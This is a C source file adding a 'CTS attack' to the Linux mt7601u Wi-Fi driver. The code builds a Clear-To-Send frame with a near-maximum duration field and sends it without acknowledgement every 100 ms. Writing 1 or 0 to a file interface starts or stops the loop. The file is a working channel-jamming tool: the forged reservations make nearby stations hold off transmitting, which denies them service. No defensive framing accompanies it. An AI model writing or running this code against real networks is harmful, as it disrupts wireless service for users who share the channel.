#include <linux/skbuff.h>
#include <linux/timer.h>
#include <linux/kernel.h>
#include <linux/ieee80211.h>
#include "mt7601u.h"

static const u8 CTS_Frame[] = {
    0x14, 0x00,     //header
    0xff, 0x7f,     //duration time 32ms
    0x7c, 0x3d, 0x09, 0x80, 0x83, 0x53, //receiver address(self)
};

static void mt7601u_cts_attack(struct mt7601u_dev *dev){
    struct sk_buff *skb;
    struct ieee80211_tx_info *info;
    struct ieee80211_tx_control control = {0};

    skb = dev_alloc_skb(sizeof(CTS_Frame));
    if(!skb)    
        return;

    skb_put_data(skb, CTS_Frame, sizeof(CTS_Frame));
    info = IEEE80211_SKB_CB(skb);
    memset(info, 0, sizeof(*info));
    info->flags |= IEEE80211_TX_CTL_NO_ACK;
    skb_set_queue_mapping(skb, 0);
    mt7601u_tx(dev->hw, &control, skb);
}

static void mt7601u_attack_work_handler(struct work_struct *work){
    struct mt7601u_dev *dev = container_of(work, struct mt7601u_dev, attack_work.work);
    if(!dev->attack_running)
        return;

    mt7601u_cts_attack(dev);
    schedule_delayed_work(&dev->attack_work, msecs_to_jiffies(100));
}

static ssize_t mt7601u_attack_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
    struct mt7601u_dev *dev = file->private_data;
    int val;

    if(kstrtoint_from_user(buf, count, 0, &val))    return -EINVAL;

    if(val == 1 && !dev->attack_running){
        dev->attack_running = true;
        INIT_DELAYED_WORK(&dev->attack_work, mt7601u_attack_work_handler);
        schedule_delayed_work(&dev->attack_work,0);
    }else if(val == 0) {
        dev->attack_running = false;
        cancel_delayed_work_sync(&dev->attack_work);
    }

    return count;
}

const struct file_operations fops_attack = {
    .write = mt7601u_attack_write,
    .open = simple_open
};